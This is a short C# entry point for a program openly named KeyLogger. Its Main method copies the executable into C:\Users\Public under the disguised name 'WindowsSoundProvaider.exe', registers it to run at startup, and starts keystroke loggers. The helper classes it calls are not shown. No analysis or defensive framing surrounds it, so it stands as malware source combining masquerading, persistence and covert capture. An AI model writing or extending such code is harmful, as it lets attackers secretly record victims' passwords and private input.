namespace KeyLogger
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            const string programmName = "WindowsSoundProvaider.exe";
            const string programPath = @"C:\Users\Public";
            Saver.SaveProgram(programPath, programmName);
            AutoRun.SetAutoRunValue();
            Logger.StartLoggers(args);
        }
    }
}